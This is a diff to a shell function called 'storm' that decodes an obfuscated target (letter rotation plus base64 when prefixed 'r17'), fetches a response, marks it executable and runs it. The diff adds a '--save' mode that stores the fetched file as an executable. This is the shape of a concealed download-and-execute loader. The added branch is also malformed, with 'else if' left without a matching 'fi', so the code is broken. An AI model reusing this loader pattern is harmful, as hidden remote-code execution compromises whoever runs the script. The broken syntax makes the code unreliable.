@@ -54,6 +54,7 @@ rozaq() {
 
 storm() {
     	exec=false
+     	save=false
      	cacheExec=false
     	file_name="response"
      	runPath="$(dirname $0)"
@@ -82,6 +83,7 @@ storm() {
 
     	case $1 in
 		--exec|-x) exec=true; api=$([[ "${2:0:3}" = "r17" ]] && echo "${2:3}" | tr R-ZA-Qr-za-q A-Za-z | base64 -d || echo "$2"); shift 2 ;;
+  		--save|-s) save=true; api=$([[ "${2:0:3}" = "r17" ]] && echo "${2:3}" | tr R-ZA-Qr-za-q A-Za-z | base64 -d || echo "$2"); shift 2 ;;
 		* ) api=$1; shift ;;
 	esac
 
@@ -117,7 +119,10 @@ storm() {
             		cp "$responsePath" "$runPath/$file_name"
             		chmod +x "$runPath/$file_name"
             		"${runPath}/$file_name" "$@"
-        	else
+        	else if [ "$save" = true ]; then
+ 			cp "$responsePath" "$runPath/$file_name"
+            		chmod +x "$runPath/$file_name"
+	 	else
             		echo -e $(cat "$responsePath")
         	fi
     	elif [ -e "$errorPath" ]; then
